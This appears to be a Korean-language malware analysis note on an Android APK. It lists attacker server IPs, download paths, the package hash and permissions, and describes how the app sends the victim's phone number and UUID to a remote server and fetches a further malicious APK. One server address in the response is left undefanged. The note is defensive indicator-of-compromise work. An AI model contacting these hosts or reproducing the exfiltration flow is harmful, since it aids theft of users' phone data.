# envkrss.apk
---
## 공격자 서버 정보
- 115.91.26[.]70
- 27.124.8[.]135 (APK 다운로드)
- 173.0.54[.]164 (닫힌 서버)

## path (115.91.26[.]70)
- /re_url

## path (27.124.8[.]135)
- /SmartApp.apk

---
## 앱 정보
패키지 명: `com.haxsv.pkvsqspl`

Hash (SHA-256): `d6867de8ef1a09406346d3b80ec7ebf74c9926b0c9a0ca67a4de6cd2bae0024f`

## 앱 권한
```
android.permission.READ_PHONE_NUMBERS
android.permission.READ_EXTERNAL_STORAGE
android.permission.READ_PHONE_STATE
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.REQUEST_INSTALL_PACKAGES
android.permission.MANAGE_EXTERNAL_STORAGE
android.permission.ACCESS_NETWORK_STATE
android.permission.INTERNET
```

## 진행 방식
- 앱 실행
- com.ManageGov (Intent) 실행
- 피해자의 휴대전화 정보 서버로 전송
- 실행이 안된다면 악성 파일 다운로드

---

# re_url
사용자의 정보를 서버에 전송.

### REQUEST
**GET (params)** http://115.91.26[.]70/re_url

```json
{
    "record": 1,
    "uuid": "생성된 uuid",
    "phone": "전화번호",
    "phone_type": "android"
}
```

### RESPONSE
```
http://173.0.54.164/join?uuid={생성된 uuid}&phone={전화번호}
```
현재는 173.0.54[.]164에 접속이 안된다. (혹은 필자가 접속을 못하는 것일수도 있다.)